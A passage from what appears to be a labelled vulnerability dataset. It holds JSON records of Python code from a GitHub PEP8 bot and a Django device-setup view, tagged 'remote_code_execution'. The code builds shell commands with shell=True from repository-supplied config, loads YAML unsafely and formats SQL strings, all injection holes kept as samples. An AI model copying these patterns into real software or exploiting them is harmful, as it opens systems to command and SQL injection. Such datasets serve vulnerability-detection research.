shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"results\"][filename] = stdout.decode(r.encoding)\n\n        os.remove(\"file_to_fix.py\")\n\n\ndef commit(data):\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    fullname = data.get(\"fork_fullname\")\n\n    for file, new_file in data[\"results\"].items():\n        url = \"https://api.github.com/repos/{}/contents/{}\"\n        url = url.format(fullname, file)\n        params = {\"ref\": data[\"new_branch\"]}\n        r = requests.get(url, params=params, headers=headers, auth=auth)\n        sha_blob = r.json().get(\"sha\")\n        params[\"path\"] = file\n        content_code = base64.b64encode(new_file.encode()).decode(\"utf-8\")\n        request_json = {\n            \"path\": file,\n            \"message\": \"Fix pep8 errors in {}\".format(file),\n            \"content\": content_code,\n            \"sha\": sha_blob,\n            \"branch\": data.get(\"new_branch\"),\n        }\n        r = requests.put(url, json=request_json, headers=headers, auth=auth)\n\n\ndef create_pr(data):\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https://api.github.com/repos/{}/pulls\"\n    url = url.format(data[\"target_repo_fullname\"])\n    request_json = {\n        \"title\": \"Fix pep8 errors\",\n        \"head\": \"pep8speaks:{}\".format(data[\"new_branch\"]),\n        \"base\": data[\"target_repo_branch\"],\n        \"body\": \"The changes are suggested by autopep8\",\n    }\n    r = requests.post(url, json=request_json, headers=headers, auth=auth)\n    if r.status_code == 201:\n        data[\"pr_url\"] = r.json()[\"html_url\"]\n    else:\n        data[\"error\"] = \"Pull request could not be created\"\n/n/n/n", "label": 0, "vtype": "remote_code_execution"}, {"id": "e09ec28786aa04bb7a6459fec6294bbb9368671a", "code": "/pep8speaks/helpers.py/n/n# -*- coding: utf-8 -*-\n\nimport base64\nimport collections\nimport datetime\nimport hmac\nimport json\nimport os\nimport re\nimport subprocess\nimport time\n\nimport psycopg2\nimport requests\nimport unidiff\nimport yaml\nfrom flask import abort\n\n\ndef update_users(repository):\n    \"\"\"Update users of the integration in the database\"\"\"\n    if os.environ.get(\"OVER_HEROKU\", False) is not False:\n        # Check if repository exists in database\n        query = r\"INSERT INTO Users (repository, created_at) VALUES ('{}', now());\" \\\n                \"\".format(repository)\n\n        try:\n            cursor.execute(query)\n            conn.commit()\n        except psycopg2.IntegrityError:  # If already exists\n            conn.rollback()\n\n\ndef follow_user(user):\n    \"\"\"Follow the user of the service\"\"\"\n    headers = {\n        \"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"],\n        \"Content-Length\": \"0\",\n    }\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https://api.github.com/user/following/{}\"\n    url = url.format(user)\n    r = requests.put(url, headers=headers, auth=auth)\n\n\ndef update_dict(base, head):\n    \"\"\"\n    Recursively merge or update dict-like objects.\n    >>> update({'k1': 1}, {'k1': {'k2': {'k3': 3}}})\n\n    Source : http://stackoverflow.com/a/32357112/4698026\n    \"\"\"\n    for key, value in head.items():\n        if isinstance(base, collections.Mapping):\n            if isinstance(value, collections.Mapping):\n                base[key] = update_dict(base.get(key, {}), value)\n            else:\n                base[key] = head[key]\n        else:\n            base = {key: head[key]}\n    return base\n\n\ndef match_webhook_secret(request):\n    \"\"\"Match the webhook secret sent from GitHub\"\"\"\n    if os.environ.get(\"OVER_HEROKU\", False) is not False:\n        header_signature = request.headers.get('X-Hub-Signature')\n        if header_signature is None:\n            abort(403)\n        sha_name, signature = header_signature.split('=')\n        if sha_name != 'sha1':\n            abort(501)\n        mac = hmac.new(os.environ[\"GITHUB_PAYLOAD_SECRET\"].encode(), msg=request.data,\n                       digestmod=\"sha1\")\n        if not hmac.compare_digest(str(mac.hexdigest()), str(signature)):\n            abort(403)\n    return True\n\n\ndef check_pythonic_pr(data):\n    \"\"\"\n    Return True if the PR contains at least one Python file\n    \"\"\"\n    files = list(get_files_involved_in_pr(data).keys())\n    pythonic = False\n    for file in files:\n        if file[-3:] == '.py':\n            pythonic = True\n            break\n\n    return pythonic\n\n\ndef get_config(data):\n    \"\"\"\n    Get .pep8speaks.yml config file from the repository and return\n    the config dictionary\n    \"\"\"\n\n    # Default configuration parameters\n    config = {\n        \"message\": {\n            \"opened\": {\n                \"header\": \"\",\n                \"footer\": \"\"\n            },\n            \"updated\": {\n                \"header\": \"\",\n                \"footer\": \"\"\n            }\n        },\n        \"scanner\": {\"diff_only\": False},\n        \"pycodestyle\": {\n            \"ignore\": [],\n            \"max-line-length\": 79,\n            \"count\": False,\n            \"first\": False,\n            \"show-pep8\": False,\n            \"filename\": [],\n            \"exclude\": [],\n            \"select\": [],\n            \"show-source\": False,\n            \"statistics\": False,\n            \"hang-closing\": False,\n        },\n        \"no_blank_comment\": True,\n        \"only_mention_files_with_errors\": True,\n    }\n\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    # Configuration file\n    url = \"https://raw.githubusercontent.com/{}/{}/.pep8speaks.yml\"\n\n    url = url.format(data[\"repository\"], data[\"after_commit_hash\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    if r.status_code == 200:\n        try:\n            new_config = yaml.load(r.text)\n            # overloading the default configuration with the one specified\n            config = update_dict(config, new_config)\n        except yaml.YAMLError:  # Bad YAML file\n            pass\n\n    # Create pycodestyle command line arguments\n    arguments = []\n    confs = config[\"pycodestyle\"]\n    for key, value in confs.items():\n        if value:  # Non empty\n            if isinstance(value, int):\n                if isinstance(value, bool):\n                    arguments.append(\"--{}\".format(key))\n                else:\n                    arguments.append(\"--{}={}\".format(key, value))\n            elif isinstance(value, list):\n                arguments.append(\"--{}={}\".format(key, ','.join(value)))\n    config[\"pycodestyle_cmd_config\"] = ' {arguments}'.format(arguments=' '.join(arguments))\n\n    # pycodestyle is case-sensitive\n    config[\"pycodestyle\"][\"ignore\"] = [e.upper() for e in list(config[\"pycodestyle\"][\"ignore\"])]\n\n    return config\n\n\ndef get_files_involved_in_pr(data):\n    \"\"\"\n    Return a list of file names modified/added in the PR\n    \"\"\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    diff_headers = headers.copy()\n    diff_headers[\"Accept\"] = \"application/vnd.github.VERSION.diff\"\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    repository = data[\"repository\"]\n    after_commit_hash = data[\"after_commit_hash\"]\n    author = data[\"author\"]\n    diff_url = \"https://api.github.com/repos/{}/pulls/{}\"\n    diff_url = diff_url.format(repository, str(data[\"pr_number\"]))\n    r = requests.get(diff_url, headers=diff_headers, auth=auth)\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    files = {}\n\n    for patchset in patch:\n        file = patchset.target_file[1:]\n        files[file] = []\n        for hunk in patchset:\n            for line in hunk.target_lines():\n                if line.is_added:\n                    files[file].append(line.target_line_no)\n\n    return files\n\n\ndef get_python_files_involved_in_pr(data):\n    files = get_files_involved_in_pr(data)\n    for file in list(files.keys()):\n        if file[-3:] != \".py\":\n            del files[file]\n\n    return files\n\n\ndef run_pycodestyle(data, config):\n    \"\"\"\n    Run pycodestyle script on the files and update the data\n    dictionary\n    \"\"\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    repository = data[\"repository\"]\n    after_commit_hash = data[\"after_commit_hash\"]\n    author = data[\"author\"]\n\n    # Run pycodestyle\n    ## All the python files with additions\n    # A dictionary with filename paired with list of new line numbers\n    py_files = get_python_files_involved_in_pr(data)\n\n    for file in py_files:\n        filename = file[1:]\n        url = \"https://raw.githubusercontent.com/{}/{}/{}\"\n        url = url.format(repository, after_commit_hash, file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_check.py\", 'w+', encoding=r.encoding) as file_to_check:\n            file_to_check.write(r.text)\n\n        # Use the command line here\n        cmd = 'pycodestyle {config[pycodestyle_cmd_config]} file_to_check.py'.format(\n            config=config)\n        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"extra_results\"][filename] = stdout.decode(r.encoding).splitlines()\n\n        # Put only relevant errors in the data[\"results\"] dictionary\n        data[\"results\"][filename] = []\n        for error in list(data[\"extra_results\"][filename]):\n            if re.search(\"^file_to_check.py:\\d+:\\d+:\\s[WE]\\d+\\s.*\", error):\n                data[\"results\"][filename].append(error.replace(\"file_to_check.py\", filename))\n                data[\"extra_results\"][filename].remove(error)\n\n        ## Remove errors in case of diff_only = True\n        ## which are caused in the whole file\n        for error in list(data[\"results\"][filename]):\n            if config[\"scanner\"][\"diff_only\"]:\n                if not int(error.split(\":\")[1]) in py_files[file]:\n                    data[\"results\"][filename].remove(error)\n\n        ## Store the link to the file\n        url = \"https://github.com/{}/blob/{}{}\"\n        data[filename + \"_link\"] = url.format(repository, after_commit_hash, file)\n        os.remove(\"file_to_check.py\")\n\n\ndef prepare_comment(request, data, config):\n    \"\"\"Construct the string of comment i.e. its header, body and footer\"\"\"\n    author = data[\"author\"]\n    # Write the comment body\n    ## Header\n    comment_header = \"\"\n    if request.json[\"action\"] == \"opened\":\n        if config[\"message\"][\"opened\"][\"header\"] == \"\":\n            comment_header = \"Hello @\" + author + \"! Thanks for submitting the PR.\\n\\n\"\n        else:\n            comment_header = config[\"message\"][\"opened\"][\"header\"] + \"\\n\\n\"\n    elif request.json[\"action\"] in [\"synchronize\", \"reopened\"]:\n        if config[\"message\"][\"updated\"][\"header\"] == \"\":\n            comment_header = \"Hello @\" + author + \"! Thanks for updating the PR.\\n\\n\"\n        else:\n            comment_header = config[\"message\"][\"updated\"][\"header\"] + \"\\n\\n\"\n\n    ## Body\n    ERROR = False  # Set to True when any pep8 error exists\n    comment_body = []\n    for file, issues in data[\"results\"].items():\n        if len(issues) == 0:\n            if not config[\"only_mention_files_with_errors\"]:\n                comment_body.append(\n                    \" - There are no PEP8 issues in the\"\n                    \" file [`{0}`]({1}) !\".format(file, data[file + \"_link\"]))\n        else:\n            ERROR = True\n            comment_body.append(\n                \" - In the file [`{0}`]({1}), following \"\n                \"are the PEP8 issues :\\n\".format(file, data[file + \"_link\"]))\n            for issue in issues:\n                ## Replace filename with L\n                error_string = issue.replace(file + \":\", \"Line \")\n\n                ## Link error codes to search query\n                error_string_list = error_string.split(\" \")\n                code = error_string_list[2]\n                code_url = \"https://duckduckgo.com/?q=pep8%20{0}\".format(code)\n                error_string_list[2] = \"[{0}]({1})\".format(code, code_url)\n\n                ## Link line numbers in the file\n                line, col = error_string_list[1][:-1].split(\":\")\n                line_url = data[file + \"_link\"] + \"#L\" + line\n                error_string_list[1] = \"[{0}:{1}]({2}):\".format(line, col, line_url)\n                error_string = \" \".join(error_string_list)\n                error_string = error_string.replace(\"Line [\", \"[Line \")\n                comment_body.append(\"\\n> {0}\".format(error_string))\n\n        comment_body.append(\"\\n\\n\")\n        if len(data[\"extra_results\"][file]) > 0:\n            comment_body.append(\" - Complete extra results for this file :\\n\\n\")\n            comment_body.append(\"> \" + \"\".join(data[\"extra_results\"][file]))\n            comment_body.append(\"---\\n\\n\")\n\n    if config[\"only_mention_files_with_errors\"] and not ERROR:\n        comment_body.append(\"Cheers ! There are no PEP8 issues in this Pull Request. :beers: \")\n\n\n    comment_body = ''.join(comment_body)\n\n\n    ## Footer\n    comment_footer = []\n    if request.json[\"action\"] == \"opened\":\n        comment_footer.append(config[\"message\"][\"opened\"][\"footer\"])\n    elif request.json[\"action\"] in [\"synchronize\", \"reopened\"]:\n        comment_footer.append(config[\"message\"][\"updated\"][\"footer\"])\n\n    comment_footer = ''.join(comment_footer)\n\n    return comment_header, comment_body, comment_footer, ERROR\n\n\ndef comment_permission_check(data, comment):\n    \"\"\"Check for quite and resume status or duplicate comments\"\"\"\n    PERMITTED_TO_COMMENT = True\n    repository = data[\"repository\"]\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    # Check for duplicate comment\n    url = \"https://api.github.com/repos/{}/issues/{}/comments\"\n    url = url.format(repository, str(data[\"pr_number\"]))\n    comments = requests.get(url, headers=headers, auth=auth).json()\n\n    # Get the last comment by the bot\n    last_comment = \"\"\n    for old_comment in reversed(comments):\n        if old_comment[\"user\"][\"id\"] == 24736507:  # ID of @pep8speaks\n            last_comment = old_comment[\"body\"]\n            break\n\n    \"\"\"\n    # Disabling this because only a single comment is made per PR\n    text1 = ''.join(BeautifulSoup(markdown(comment)).findAll(text=True))\n    text2 = ''.join(BeautifulSoup(markdown(last_comment)).findAll(text=True))\n    if text1 == text2.replace(\"submitting\", \"updating\"):\n        PERMITTED_TO_COMMENT = False\n    \"\"\"\n\n    # Check if the bot is asked to keep quiet\n    for old_comment in reversed(comments):\n        if '@pep8speaks' in old_comment['body']:\n            if 'resume' in old_comment['body'].lower():\n                break\n            elif 'quiet' in old_comment['body'].lower():\n                PERMITTED_TO_COMMENT = False\n\n\n    return PERMITTED_TO_COMMENT\n\n\ndef create_or_update_comment(data, comment):\n    comment_mode = None\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    query = \"https://api.github.com/repos/{}/issues/{}/comments\"\n    query = query.format(data[\"repository\"], str(data[\"pr_number\"]))\n    comments = requests.get(query, headers=headers, auth=auth).json()\n\n    # Get the last comment id by the bot\n    last_comment_id = None\n    for old_comment in comments:\n        if old_comment[\"user\"][\"id\"] == 24736507:  # ID of @pep8speaks\n            last_comment_id = old_comment[\"id\"]\n            break\n\n    if last_comment_id is None:  # Create a new comment\n        response = requests.post(query, json={\"body\": comment}, headers=headers, auth=auth)\n        data[\"comment_response\"] = response.json()\n    else:  # Update the last comment\n        utc_time = datetime.datetime.utcnow()\n        time_now = utc_time.strftime(\"%B %d, %Y at %H:%M Hours UTC\")\n        comment += \"\\n\\n##### Comment last updated on {}\"\n        comment = comment.format(time_now)\n\n        query = \"https://api.github.com/repos/{}/issues/comments/{}\"\n        query = query.format(data[\"repository\"], str(last_comment_id))\n        response = requests.patch(query, json={\"body\": comment}, headers=headers, auth=auth)\n\n\ndef autopep8(data, config):\n    # Run pycodestyle\n\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(data[\"diff_url\"], headers=headers, auth=auth)\n    ## All the python files with additions\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    # A dictionary with filename paired with list of new line numbers\n    py_files = {}\n\n    for patchset in patch:\n        if patchset.target_file[-3:] == '.py':\n            py_file = patchset.target_file[1:]\n            py_files[py_file] = []\n            for hunk in patchset:\n                for line in hunk.target_lines():\n                    if line.is_added:\n                        py_files[py_file].append(line.target_line_no)\n\n    # Ignore errors and warnings specified in the config file\n    to_ignore = \",\".join(config[\"pycodestyle\"][\"ignore\"])\n    arg_to_ignore = \"\"\n    if len(to_ignore) > 0:\n        arg_to_ignore = \"--ignore \" + to_ignore\n\n    for file in py_files:\n        filename = file[1:]\n        url = \"https://raw.githubusercontent.com/{}/{}/{}\"\n        url = url.format(data[\"repository\"], data[\"sha\"], file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix:\n            file_to_fix.write(r.text)\n\n        cmd = 'autopep8 file_to_fix.py --diff {arg_to_ignore}'.format(\n            arg_to_ignore=arg_to_ignore)\n        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"diff\"][filename] = stdout.decode(r.encoding)\n\n        # Fix the errors\n        data[\"diff\"][filename] = data[\"diff\"][filename].replace(\"file_to_check.py\", filename)\n        data[\"diff\"][filename] = data[\"diff\"][filename].replace(\"\\\\\", \"\\\\\\\\\")\n\n        ## Store the link to the file\n        url = \"https://github.com/{}/blob/{}{}\"\n        data[filename + \"_link\"] = url.format(data[\"repository\"], data[\"sha\"], file)\n        os.remove(\"file_to_fix.py\")\n\n\ndef create_gist(data, config):\n    \"\"\"Create gists for diff files\"\"\"\n    REQUEST_JSON = {}\n    REQUEST_JSON[\"public\"] = True\n    REQUEST_JSON[\"files\"] = {}\n    REQUEST_JSON[\"description\"] = \"In response to @{0}'s comment : {1}\".format(\n        data[\"reviewer\"], data[\"review_url\"])\n\n    for file, diffs in data[\"diff\"].items():\n        if len(diffs) != 0:\n            REQUEST_JSON[\"files\"][file.split(\"/\")[-1] + \".diff\"] = {\n                \"content\": diffs\n            }\n\n    # Call github api to create the gist\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https://api.github.com/gists\"\n    res = requests.post(url, json=REQUEST_JSON, headers=headers, auth=auth).json()\n    data[\"gist_response\"] = res\n    data[\"gist_url\"] = res[\"html_url\"]\n\n\ndef delete_if_forked(data):\n    FORKED = False\n    url = \"https://api.github.com/user/repos\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    for repo in r.json():\n        if repo[\"description\"]:\n            if data[\"target_repo_fullname\"] in repo[\"description\"]:\n                FORKED = True\n                r = requests.delete(\"https://api.github.com/repos/\"\n                                \"{}\".format(repo[\"full_name\"]),\n                                headers=headers, auth=auth)\n    return FORKED\n\n\ndef fork_for_pr(data):\n    FORKED = False\n    url = \"https://api.github.com/repos/{}/forks\"\n    url = url.format(data[\"target_repo_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.post(url, headers=headers, auth=auth)\n    if r.status_code == 202:\n        data[\"fork_fullname\"] = r.json()[\"full_name\"]\n        FORKED = True\n    else:\n        data[\"error\"] = \"Unable to fork\"\n    return FORKED\n\n\ndef update_fork_desc(data):\n    # Check if forked (takes time)\n    url = \"https://api.github.com/repos/{}\".format(data[\"fork_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    ATTEMPT = 0\n    while(r.status_code != 200):\n        time.sleep(5)\n        r = requests.get(url, headers=headers, auth=auth)\n        ATTEMPT += 1\n        if ATTEMPT > 10:\n            data[\"error\"] = \"Forking is taking more than usual time\"\n            break\n\n    full_name = data[\"target_repo_fullname\"]\n    author, name = full_name.split(\"/\")\n    request_json = {\n        \"name\": name,\n        \"description\": \"Forked from @{}'s {}\".format(author, full_name)\n    }\n    r = requests.patch(url, data=json.dumps(request_json), headers=headers, auth=auth)\n    if r.status_code != 200:\n        data[\"error\"] = \"Could not update description of the fork\"\n\n\ndef create_new_branch(data):\n    url = \"https://api.github.com/repos/{}/git/refs/heads\"\n    url = url.format(data[\"fork_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    sha = None\n    r = requests.get(url, headers=headers, auth=auth)\n    for ref in r.json():\n        if ref[\"ref\"].split(\"/\")[-1] == data[\"target_repo_branch\"]:\n            sha = ref[\"object\"][\"sha\"]\n\n    url = \"https://api.github.com/repos/{}/git/refs\"\n    url = url.format(data[\"fork_fullname\"])\n    data[\"new_branch\"] = \"{}-pep8-patch\".format(data[\"target_repo_branch\"])\n    request_json = {\n        \"ref\": \"refs/heads/{}\".format(data[\"new_branch\"]),\n        \"sha\": sha,\n    }\n    r = requests.post(url, json=request_json, headers=headers, auth=auth)\n\n    if r.status_code != 200:\n        data[\"error\"] = \"Could not create new branch in the fork\"\n\n\ndef autopep8ify(data, config):\n    # Run pycodestyle\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(data[\"diff_url\"], headers=headers, auth=auth)\n\n    ## All the python files with additions\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    # A dictionary with filename paired with list of new line numbers\n    py_files = {}\n\n    for patchset in patch:\n        if patchset.target_file[-3:] == '.py':\n            py_file = patchset.target_file[1:]\n            py_files[py_file] = []\n            for hunk in patchset:\n                for line in hunk.target_lines():\n                    if line.is_added:\n                        py_files[py_file].append(line.target_line_no)\n\n    # Ignore errors and warnings specified in the config file\n    to_ignore = \",\".join(config[\"pycodestyle\"][\"ignore\"])\n    arg_to_ignore = \"\"\n    if len(to_ignore) > 0:\n        arg_to_ignore = \"--ignore \" + to_ignore\n\n    for file in py_files:\n        filename = file[1:]\n        url = \"https://raw.githubusercontent.com/{}/{}/{}\"\n        url = url.format(data[\"repository\"], data[\"sha\"], file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix:\n            file_to_fix.write(r.text)\n\n        cmd = 'autopep8 file_to_fix.py {arg_to_ignore}'.format(\n            arg_to_ignore=arg_to_ignore)\n        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"results\"][filename] = stdout.decode(r.encoding)\n\n        os.remove(\"file_to_fix.py\")\n\n\ndef commit(data):\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    fullname = data.get(\"fork_fullname\")\n\n    for file, new_file in data[\"results\"].items():\n        url = \"https://api.github.com/repos/{}/contents/{}\"\n        url = url.format(fullname, file)\n        params = {\"ref\": data[\"new_branch\"]}\n        r = requests.get(url, params=params, headers=headers, auth=auth)\n        sha_blob = r.json().get(\"sha\")\n        params[\"path\"] = file\n        content_code = base64.b64encode(new_file.encode()).decode(\"utf-8\")\n        request_json = {\n            \"path\": file,\n            \"message\": \"Fix pep8 errors in {}\".format(file),\n            \"content\": content_code,\n            \"sha\": sha_blob,\n            \"branch\": data.get(\"new_branch\"),\n        }\n        r = requests.put(url, json=request_json, headers=headers, auth=auth)\n\n\ndef create_pr(data):\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https://api.github.com/repos/{}/pulls\"\n    url = url.format(data[\"target_repo_fullname\"])\n    request_json = {\n        \"title\": \"Fix pep8 errors\",\n        \"head\": \"pep8speaks:{}\".format(data[\"new_branch\"]),\n        \"base\": data[\"target_repo_branch\"],\n        \"body\": \"The changes are suggested by autopep8\",\n    }\n    r = requests.post(url, json=request_json, headers=headers, auth=auth)\n    if r.status_code == 201:\n        data[\"pr_url\"] = r.json()[\"html_url\"]\n    else:\n        data[\"error\"] = \"Pull request could not be created\"\n/n/n/n", "label": 1, "vtype": "remote_code_execution"}, {"id": "9b7805119938343fcac9dc929d8882f1d97cf14a", "code": "vuedj/configtitania/views.py/n/nfrom django.shortcuts import render\nfrom django.http import HttpResponse, JsonResponse\nfrom django.views.decorators.csrf import csrf_exempt\n\nfrom rest_framework.renderers import JSONRenderer\nfrom rest_framework.parsers import JSONParser\nfrom rest_framework.response import Response\nfrom rest_framework import viewsets\nfrom rest_framework.decorators import list_route\nfrom flask import escape\n\nfrom .models import BoxDetails, RegisteredServices\nfrom .serializers import BoxDetailsSerializer, RegisteredServicesSerializer\n\nimport common, sqlite3, subprocess, NetworkManager, crypt, pwd, getpass, spwd\n\n# fetch network AP details\nnm = NetworkManager.NetworkManager\nwlans = [d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)]\n\ndef get_osversion():\n    \"\"\"\n    PRETTY_NAME of your Titania os (in lowercase).\n    \"\"\"\n    with open(\"/etc/os-release\") as f:\n        osfilecontent = f.read().split(\"\\n\")\n        # $PRETTY_NAME is at the 5th position\n        version = osfilecontent[4].split('=')[1].strip('\\\"')\n        return version\n\ndef get_allconfiguredwifi():\n    \"\"\"\n    nmcli con | grep 802-11-wireless\n    \"\"\"\n    ps = subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0]\n    wifirows = ps.split('\\n')\n    wifi = []\n    for row in wifirows:\n        name = row.split(':')\n        print(name)\n        wifi.append(name[0])\n    return wifi\n\ndef get_allAPs():\n    \"\"\"\n    nmcli con | grep 802-11-wireless\n    \"\"\"\n    ps = subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0]\n    wifirows = ps.split('\\n')\n    wifi = []\n    for row in wifirows:\n        entry = row.split(':')\n        print(entry)\n        wifi.append(entry)\n    return wifi\n    # wifi_aps = []   \n    # for dev in wlans:\n    #     for ap in dev.AccessPoints:\n    #         wifi_aps.append(ap.Ssid)\n    # return wifi_aps\n\ndef add_user(username, password):\n    encPass = crypt.crypt(password,\"22\")\n    #subprocess escapes the username stopping code injection\n    subprocess.call(['useradd','-G','docker,wheel','-p',encPass,username])\n\ndef add_newWifiConn(wifiname, wifipass):\n    print(wlans)\n    wlan0 = wlans[0]\n    print(wlan0)\n    print(wifiname)\n    # get selected ap as currentwifi\n    for dev in wlans:\n        for ap in dev.AccessPoints:\n            if ap.Ssid == wifiname:\n                currentwifi = ap\n    print(currentwifi)\n    # params to set password\n    params = {\n            \"802-11-wireless\": {\n                \"security\": \"802-11-wireless-security\",\n            },\n            \"802-11-wireless-security\": {\n                \"key-mgmt\": \"wpa-psk\",\n                \"psk\": wifipass\n            },\n        }\n    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi)        \n\ndef delete_WifiConn(wifiap):\n    \"\"\"\n    nmcli connection delete id <connection name>\n    \"\"\"\n    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE)\n    print(ps)\n\ndef edit_WifiConn(wifiname, wifipass):\n    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE)\n    print(ps)\n    print(wlans)\n    wlan0 = wlans[0]\n    print(wlan0)\n    print(wifiname)\n    # get selected ap as currentwifi\n    for dev in wlans:\n        for ap in dev.AccessPoints:\n            if ap.Ssid == wifiname:\n                currentwifi = ap\n    # params to set password\n    params = {\n            \"802-11-wireless\": {\n                \"security\": \"802-11-wireless-security\",\n            },\n            \"802-11-wireless-security\": {\n                \"key-mgmt\": \"wpa-psk\",\n                \"psk\": wifipass\n            },\n        }\n    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi) \n    return       \n\n@csrf_exempt\ndef handle_config(request):\n    \"\"\"\n    List all code snippets, or create a new snippet.\n    \"\"\" \n    if request.method == 'POST':\n        action = request.POST.get(\"_action\")\n        print(action)\n        if action == 'registerService':\n            request_name = request.POST.get(\"name\")\n            request_address = request.POST.get(\"address\")\n            request_icon = request.POST.get(\"icon\")\n            print(request_name)\n            print(request_address)\n            print(request_icon)\n            setServiceDetails = RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon)\n            return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False)\n        elif action == 'getSchema':\n            schema = get_osversion()\n            return JsonResponse({\"version_info\":schema}, safe=False)\n        elif action == 'getIfConfigured':\n            print(action)\n            queryset = BoxDetails.objects.all()\n            serializer = BoxDetailsSerializer(queryset, many=True)\n            return JsonResponse(serializer.data, safe=False)\n        elif action == 'loadDependencies':\n            print(action)\n            queryset = RegisteredServices.objects.all()\n            serializer = RegisteredServicesSerializer(queryset, many=True)\n            return JsonResponse(serializer.data, safe=False)\n        elif action == 'getAllAPs':\n            wifi_aps = get_allAPs()\n            return JsonResponse(wifi_aps, safe=False)\n        elif action == 'saveUserDetails':\n            print(action)\n            boxname = escape(request.POST.get(\"boxname\"))\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            print(username)\n            add_user(username,password)\n            setBoxName = BoxDetails(boxname=boxname)\n            setBoxName.save()\n            # connect to wifi ap user selected\n            wifi_pass = request.POST.get(\"wifi_password\")\n            wifi_name = request.POST.get(\"wifi_ap\")\n            if len(wifi_name) > 0:\n                add_newWifiConn(wifi_name,wifi_pass)\n            return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False)\n        elif action == 'login':\n            print(action)\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            output=''\n            \"\"\"Tries to authenticate a user.\n            Returns True if the authentication succeeds, else the reason\n            (string) is returned.\"\"\"\n            try:\n                enc_pwd = spwd.getspnam(username)[1]\n                if enc_pwd in [\"NP\", \"!\", \"\", None]:\n                    output = \"User '%s' has no password set\" % username\n                if enc_pwd in [\"LK\", \"*\"]:\n                    output = \"account is locked\"\n                if enc_pwd == 